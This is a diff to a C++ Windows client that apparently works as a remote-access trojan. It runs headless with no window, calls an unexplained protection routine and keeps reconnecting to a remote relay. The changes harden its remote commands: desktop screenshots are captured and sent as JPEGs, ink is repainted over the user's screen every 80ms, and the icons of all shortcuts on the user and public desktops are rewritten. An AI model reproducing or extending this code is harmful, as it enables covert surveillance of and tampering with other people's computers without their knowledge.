@@ -46,6 +46,7 @@ static int  g_port         = DEFAULT_RELAY_PORT;
 static char g_nameBuf[128] = "Client";
 static ws::SocketT g_sock = ws::INVALID;
 static std::atomic<bool> g_connected{false};
+static bool g_sessionAlive = false;
 static uint32_t g_clientId = 0;
 static ws::Receiver g_receiver;
 
@@ -56,6 +57,67 @@ static bool g_logDirty = false;
 
 // GDI+
 static ULONG_PTR g_gdiplusToken = 0;
+
+// ═══════════════════════════════════════════════════════════════════
+//  DRAW INK — strokes are kept in memory and replayed onto the
+//  desktop DC every time something might have wiped them (screen
+//  capture's BitBlt, desktop redraw, etc). The server-side stroke
+//  history is the source of truth; the client just re-renders.
+// ═══════════════════════════════════════════════════════════════════
+struct DrawStroke {
+    int x0, y0, x1, y1;
+    uint32_t rgb;
+    uint32_t width;
+    bool isDot;
+};
+static std::mutex g_drawMutex;
+static std::vector<DrawStroke> g_strokes;
+
+static void redrawAllStrokes() {
+    HDC dc = GetDC(nullptr);
+    if (!dc) return;
+    std::lock_guard<std::mutex> lk(g_drawMutex);
+    for (auto& s : g_strokes) {
+        HPEN pen = CreatePen(PS_SOLID, (int)s.width, s.rgb);
+        if (!pen) continue;
+        HGDIOBJ old = SelectObject(dc, pen);
+        SelectObject(dc, GetStockObject(NULL_BRUSH));
+        if (s.isDot) {
+            Ellipse(dc, s.x1 - (int)s.width, s.y1 - (int)s.width,
+                       s.x1 + (int)s.width, s.y1 + (int)s.width);
+        } else {
+            MoveToEx(dc, s.x0, s.y0, nullptr);
+            LineTo(dc, s.x1, s.y1);
+        }
+        SelectObject(dc, old);
+        DeleteObject(pen);
+    }
+    ReleaseDC(nullptr, dc);
+}
+
+// Background thread that re-applies all strokes every 300ms. The desktop
+// DC is volatile — any window repaint, screen capture BitBlt, or DWM
+// composition invalidates the ink. This timer keeps strokes visible
+// without blocking the receiver thread (which caused crashes when
+// GetDC + GDI drawing happened inside the WS handler).
+static std::atomic<bool> g_drawRepaintRunning{false};
+static std::thread g_drawRepaintThread;
+
+static void startDrawRepaintThread() {
+    if (g_drawRepaintRunning) return;
+    g_drawRepaintRunning = true;
+    g_drawRepaintThread = std::thread([]() {
+        while (g_drawRepaintRunning) {
+            Sleep(80);
+            if (!g_strokes.empty()) redrawAllStrokes();
+        }
+    });
+}
+
+static void stopDrawRepaintThread() {
+    g_drawRepaintRunning = false;
+    if (g_drawRepaintThread.joinable()) g_drawRepaintThread.join();
+}
 
 // ── Log helper ──────────────────────────────────────────────────────
 static void addLog(const char* fmt, ...) {
@@ -221,8 +283,12 @@ static void cmdViewScreen(std::vector<uint8_t>& out) {
         return;
     }
 
-    // Capture screen via BitBlt into a DDB
-    HDC screenDC = GetDC(nullptr);
+    // Capture screen via BitBlt. Try desktop window first (works in
+    // service-session and interactive sessions alike), fall back to
+    // GetDC(nullptr) if the desktop hwnd rejects the call.
+    HWND deskHwnd = GetDesktopWindow();
+    HDC screenDC = deskHwnd ? GetDC(deskHwnd) : nullptr;
+    if (!screenDC) screenDC = GetDC(nullptr);
     if (!screenDC) {
         proto::Writer wr; wr.str("Error: GetDC failed");
         out = wr.bytes(); return;
@@ -241,7 +307,7 @@ static void cmdViewScreen(std::vector<uint8_t>& out) {
     uint8_t* pixels = nullptr;
     HBITMAP hBmp = CreateDIBSection(screenDC, &bmi, DIB_RGB_COLORS, (void**)&pixels, nullptr, 0);
     if (!hBmp || !pixels) {
-        ReleaseDC(nullptr, screenDC);
+        ReleaseDC(deskHwnd, screenDC);
         proto::Writer wr; wr.str("Error: CreateDIBSection failed");
         out = wr.bytes(); return;
     }
@@ -251,41 +317,39 @@ static void cmdViewScreen(std::vector<uint8_t>& out) {
     BOOL ok = BitBlt(memDC, 0, 0, w, h, screenDC, 0, 0, SRCCOPY | CAPTUREBLT);
     SelectObject(memDC, oldBmp);
     DeleteDC(memDC);
-    ReleaseDC(nullptr, screenDC);
+    ReleaseDC(deskHwnd, screenDC);
 
     addLog("[*] ViewScreen: BitBlt=%d, pixels[0]=%02X%02X%02X%02X",
            (int)ok,
            pixels[0], pixels[1], pixels[2], pixels[3]);
 
     if (!ok) {
+        DWORD gle = GetLastError();
         DeleteObject(hBmp);
-        proto::Writer wr; wr.str("Error: BitBlt failed");
-        out = wr.bytes(); return;
-    }
-
-    // FromHBITMAP on DIB-section makes a 32bpp ARGB copy
-    std::unique_ptr<Gdiplus::Bitmap> bmp(Gdiplus::Bitmap::FromHBITMAP(hBmp, nullptr));
-    DeleteObject(hBmp);
-
-    if (!bmp || bmp->GetLastStatus() != Gdiplus::Ok) {
-        addLog("[!] ViewScreen: FromHBITMAP failed");
-        proto::Writer wr;
-        wr.str("Error: FromHBITMAP failed");
+        char buf[64];
+        snprintf(buf, sizeof(buf), "Error: BitBlt failed (gle=%lu)", gle);
+        proto::Writer wr; wr.str(buf);
         out = wr.bytes();
+        addLog("[!] ViewScreen: %s (screen may be locked or session 0)", buf);
         return;
     }
 
-    // Check if capture looks blank: sample 9 evenly distributed pixels.
-    // If they are all identical (likely black/uniform), the screen may be
-    // in an idle/non-interactive session and there's nothing to display.
+    // FromHBITMAP on DIB-section makes a 32bpp ARGB copy of the pixels.
+    std::unique_ptr<Gdiplus::Bitmap> bmp(Gdiplus::Bitmap::FromHBITMAP(hBmp, nullptr));
+
+    // Sample 9 evenly distributed pixels BEFORE freeing the DIB section.
+    // Use size_t arithmetic to avoid signed-int overflow on big screens.
     {
         bool uniform = true;
         uint32_t sampleColor = 0;
+        const size_t W = (size_t)w;
+        const size_t H = (size_t)h;
         for (int sy = 0; sy < 3 && uniform; sy++) {
             for (int sx = 0; sx < 3 && uniform; sx++) {
-                int px = (w / 4) * (sx + 1);
-                int py = (h / 4) * (sy + 1);
-                int idx = py * w + px;
+                size_t px = (W / 4) * (size_t)(sx + 1);
+                size_t py = (H / 4) * (size_t)(sy + 1);
+                if (px >= W || py >= H) continue;
+                size_t idx = py * W + px;
                 uint32_t c = ((uint32_t*)pixels)[idx];
                 if (sy == 0 && sx == 0) sampleColor = c;
                 else if (c != sampleColor) uniform = false;
@@ -297,6 +361,16 @@ static void cmdViewScreen(std::vector<uint8_t>& out) {
         } else {
             addLog("[*] ViewScreen: captured frame OK (varied colors)");
         }
+    }
+
+    DeleteObject(hBmp);
+
+    if (!bmp || bmp->GetLastStatus() != Gdiplus::Ok) {
+        addLog("[!] ViewScreen: FromHBITMAP failed");
+        proto::Writer wr;
+        wr.str("Error: FromHBITMAP failed");
+        out = wr.bytes();
+        return;
     }
 
     // Create IStream to hold the encoded image
@@ -320,7 +394,7 @@ static void cmdViewScreen(std::vector<uint8_t>& out) {
         params.Count = 1;
         params.Parameter[0].Guid  = Gdiplus::EncoderQuality;
         params.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
-        ULONG quality = 50;
+        ULONG quality = 35;
         params.Parameter[0].Value = &quality;
 
         Gdiplus::Status st = bmp->Save(stream, &encClsid, &params);
@@ -682,62 +756,78 @@ static void cmdReplaceIcons(const std::vector<uint8_t>& payload, std::vector<uin
         proto::Writer w; w.str("Icon file not found"); out = w.bytes(); return;
     }
 
-    // Find desktop folder via SHGetFolderPath
-    char desktopPath[MAX_PATH];
-    if (FAILED(SHGetFolderPathA(nullptr, CSIDL_DESKTOP, nullptr, 0, desktopPath))) {
+    // COM must be initialized for IShellLink / IPersistFile
+    HRESULT hrCo = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
+    if (FAILED(hrCo) && hrCo != RPC_E_CHANGED_MODE) {
+        proto::Writer w; w.str("CoInitialize failed"); out = w.bytes(); return;
+    }
+
+    // Collect .lnk files from BOTH user desktop and common (public) desktop
+    std::vector<std::string> desktopDirs;
+    char userDesktop[MAX_PATH] = {};
+    char commonDesktop[MAX_PATH] = {};
+    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_DESKTOP, nullptr, 0, userDesktop)))
+        desktopDirs.push_back(userDesktop);
+    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_COMMON_DESKTOPDIRECTORY, nullptr, 0, commonDesktop)))
+        desktopDirs.push_back(commonDesktop);
+
+    if (desktopDirs.empty()) {
+        if (SUCCEEDED(hrCo)) CoUninitialize();
         proto::Writer w; w.str("Cannot find Desktop"); out = w.bytes(); return;
     }
 
-    // Search for *.lnk files on Desktop
-    char searchPath[MAX_PATH];
-    snprintf(searchPath, sizeof(searchPath), "%s\\*.lnk", desktopPath);
-
-    WIN32_FIND_DATAA fd;
-    HANDLE hFind = FindFirstFileA(searchPath, &fd);
-    if (hFind == INVALID_HANDLE_VALUE) {
-        proto::Writer w; w.str("No .lnk files on Desktop"); out = w.bytes(); return;
-    }
-
     int replaced = 0, failed = 0;
-    do {
-        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
-            std::string fullPath = std::string(desktopPath) + "\\" + fd.cFileName;
+    for (auto& desktopPath : desktopDirs) {
+        char searchPath[MAX_PATH];
+        snprintf(searchPath, sizeof(searchPath), "%s\\*.lnk", desktopPath.c_str());
 
-            // Open the shortcut as IShellLink
-            IShellLinkA* psl = nullptr;
-            if (FAILED(CoCreateInstance(CLSID_ShellLink, nullptr, CLSCTX_INPROC_SERVER,
-                IID_IShellLinkA, (void**)&psl))) {
-                failed++;
-                continue;
-            }
+        WIN32_FIND_DATAA fd;
+        HANDLE hFind = FindFirstFileA(searchPath, &fd);
+        if (hFind == INVALID_HANDLE_VALUE) continue;
 
-            IPersistFile* ppf = nullptr;
-            if (FAILED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) {
+        do {
+            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                std::string fullPath = desktopPath + "\\" + fd.cFileName;
+
+                IShellLinkA* psl = nullptr;
+                if (FAILED(CoCreateInstance(CLSID_ShellLink, nullptr, CLSCTX_INPROC_SERVER,
+                    IID_IShellLinkA, (void**)&psl))) {
+                    failed++;
+                    continue;
+                }
+
+                IPersistFile* ppf = nullptr;
+                if (FAILED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) {
+                    psl->Release();
+                    failed++;
+                    continue;
+                }
+
+                int wl = MultiByteToWideChar(CP_ACP, 0, fullPath.c_str(), -1, nullptr, 0);
+                std::wstring wpath(wl, 0);
+                MultiByteToWideChar(CP_ACP, 0, fullPath.c_str(), -1, &wpath[0], wl);
+
+                if (SUCCEEDED(ppf->Load(wpath.c_str(), STGM_READWRITE))) {
+                    psl->SetIconLocation(iconPath.c_str(), 0);
+                    if (SUCCEEDED(ppf->Save(wpath.c_str(), TRUE))) {
+                        replaced++;
+                    } else {
+                        failed++;
+                    }
+                } else {
+                    failed++;
+                }
+                ppf->Release();
                 psl->Release();
-                failed++;
-                continue;
             }
-
-            // Wide string path
-            int wl = MultiByteToWideChar(CP_ACP, 0, fullPath.c_str(), -1, nullptr, 0);
-            std::wstring wpath(wl, 0);
-            MultiByteToWideChar(CP_ACP, 0, fullPath.c_str(), -1, &wpath[0], wl);
-
-            if (SUCCEEDED(ppf->Load(wpath.c_str(), STGM_READWRITE))) {
-                psl->SetIconLocation(iconPath.c_str(), 0);
-                ppf->Save(wpath.c_str(), TRUE);  // TRUE = mark dirty
-                replaced++;
-            } else {
-                failed++;
-            }
-            ppf->Release();
-            psl->Release();
-        }
-    } while (FindNextFileA(hFind, &fd));
-    FindClose(hFind);
+        } while (FindNextFileA(hFind, &fd));
+        FindClose(hFind);
+    }
 
     // Notify shell to refresh icons
     SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST | SHCNF_FLUSHNOWAIT, nullptr, nullptr);
+
+    if (SUCCEEDED(hrCo)) CoUninitialize();
 
     char buf[128];
     snprintf(buf, sizeof(buf), "OK: %d icons replaced, %d failed", replaced, failed);
@@ -747,14 +837,16 @@ static void cmdReplaceIcons(const std::vector<uint8_t>& payload, std::vector<uin
 
 // ── Message handler (receiver thread) ───────────────────────────────
 static void onMessage(uint8_t msgType, uint8_t cmdType, std::vector<uint8_t> payload) {
-    if (msgType == 0) {
+    if (msgType == proto::MSG_DISCONNECT) {
+        g_sessionAlive = false;
         g_connected = false;
-        addLog("[!] Disconnected from relay");
+        addLog("[!] Disconnected from relay (server request)");
         return;
     }
     if (msgType == proto::MSG_KICK_CLIENT) {
         addLog("[!] Kicked by server — exiting");
-        printf("\n[!] Kicked by server. Disconnecting...\n");
+        g_sessionAlive = false;
+        g_connected = false;
         if (g_sock != ws::INVALID) {
             ws::close(g_sock);
             g_sock = ws::INVALID;
@@ -811,34 +903,32 @@ static void onMessage(uint8_t msgType, uint8_t cmdType, std::vector<uint8_t> pay
         break;
     case proto::CMD_DRAW: {
         // Draw on screen: payload = [type:1] [x:4] [y:4] [r:1] [g:1] [b:1] [size:4]
-        // type 0=draw, 1=clear, 2=line from last pos
+        // type 0=pen down (start new stroke), 1=clear, 2=drag (line segment)
+        // Strokes are ONLY appended to g_strokes here — the background
+        // repaint thread redraws them onto the desktop every 300ms.
+        // This avoids GDI calls on the receiver thread (which caused
+        // crashes and disconnects when mixed with cmdViewScreen).
         proto::Reader r(payload.data(), payload.size());
         uint8_t dtype; uint32_t x, y; uint8_t cr, cg, cb; uint32_t sz;
         if (r.u8(dtype) && r.u32(x) && r.u32(y) && r.u8(cr) && r.u8(cg) && r.u8(cb) && r.u32(sz)) {
+            uint32_t rgb = RGB(cr, cg, cb);
             if (dtype == 1) {
-                // Clear — redraw desktop (InvalidateRect)
+                std::lock_guard<std::mutex> lk(g_drawMutex);
+                g_strokes.clear();
                 InvalidateRect(nullptr, nullptr, TRUE);
                 addLog("[>] Draw: clear");
             } else {
-                // Draw dot/line on screen via GDI
-                HDC dc = GetDC(nullptr);
-                HPEN pen = CreatePen(PS_SOLID, sz, RGB(cr, cg, cb));
-                HGDIOBJ old = SelectObject(dc, pen);
-                if (dtype == 2) {
-                    // Line to this point from last
-                    LineTo(dc, x, y);
-                } else {
-                    MoveToEx(dc, x, y, nullptr);
-                    // Draw a small circle
-                    SelectObject(dc, GetStockObject(DC_PEN));
-                    SetDCPenColor(dc, RGB(cr, cg, cb));
-                    SelectObject(dc, GetStockObject(DC_BRUSH));
-                    SetDCBrushColor(dc, RGB(cr, cg, cb));
-                    Ellipse(dc, x - (int)sz, y - (int)sz, x + (int)sz, y + (int)sz);
+                std::lock_guard<std::mutex> lk(g_drawMutex);
+                if (dtype == 0) {
+                    g_strokes.push_back({(int)x, (int)y, (int)x, (int)y, rgb, sz, true});
+                } else {  // dtype == 2 — drag
+                    if (g_strokes.empty()) {
+                        g_strokes.push_back({(int)x, (int)y, (int)x, (int)y, rgb, sz, true});
+                    } else {
+                        auto& prev = g_strokes.back();
+                        g_strokes.push_back({prev.x1, prev.y1, (int)x, (int)y, rgb, sz, false});
+                    }
                 }
-                SelectObject(dc, old);
-                DeleteObject(pen);
-                ReleaseDC(nullptr, dc);
             }
         }
         proto::Writer w; w.str("OK"); resp = w.bytes();
@@ -890,6 +980,7 @@ static void doConnect() {
         g_sock = ws::INVALID;
     }
     g_connected = false;
+    g_sessionAlive = true;
     addLog("[*] Connecting to %s:%d ...", g_hostBuf, g_port);
 
     std::thread([]() {
@@ -902,13 +993,14 @@ static void doConnect() {
         g_sock = ws::connect(std::string(g_hostBuf), g_port, regPayload);
         if (g_sock == ws::INVALID) {
             addLog("[!] Connect failed: %s", ws::lastError().c_str());
+            g_connected = false;
             g_connecting = false;
             return;
         }
         g_connected = true;
         g_connecting = false;
-        g_receiver.start(g_sock, onMessage);
-        addLog("[+] Connected to relay %s:%d", g_hostBuf, g_port);
+        g_receiver.start(g_sock, onMessage, &g_sessionAlive);
+        addLog("[+] Connected to relay %s:%d as '%s'", g_hostBuf, g_port, g_nameBuf);
     }).detach();
 }
 
@@ -926,6 +1018,13 @@ int main() {
     // ── Pure headless main, no console, no window ─────────────────
     InitializeProtection();
     ws::init();
+
+    // Initialize GDI+ — required for cmdViewScreen (FromHBITMAP + JPEG/PNG encoder)
+    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
+    Gdiplus::GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, nullptr);
+
+    // Start the ink repaint thread — keeps strokes visible on the desktop
+    startDrawRepaintThread();
 
     // Use computer name as default client name
     DWORD sz = sizeof(g_nameBuf);
@@ -945,16 +1044,18 @@ int main() {
     }
 
     // Auto-reconnect loop with exponential backoff (5s → 60s cap)
-    int retryDelay = 5;
+    int retryDelay = 2;
     while (true) {
+        g_sessionAlive = false;
         doConnect();
 
-        // While connected, stay alive (10s poll)
+        while (g_connecting) Sleep(50);
+
         while (g_connected) {
-            Sleep(10000);
+            Sleep(3000);
         }
 
-        // Cleanup and wait before reconnecting
+        g_sessionAlive = false;
         if (g_sock != ws::INVALID) {
             ws::close(g_sock);
             g_sock = ws::INVALID;
@@ -962,10 +1063,11 @@ int main() {
         g_connected = false;
 
         Sleep(retryDelay * 1000);
-        retryDelay = (retryDelay < 60) ? retryDelay * 2 : 60;
+        retryDelay = (retryDelay < 30) ? retryDelay * 2 : 30;
     }
 
     // Unreachable
     ws::shutdown();
+    Gdiplus::GdiplusShutdown(g_gdiplusToken);
     return 0;
 }
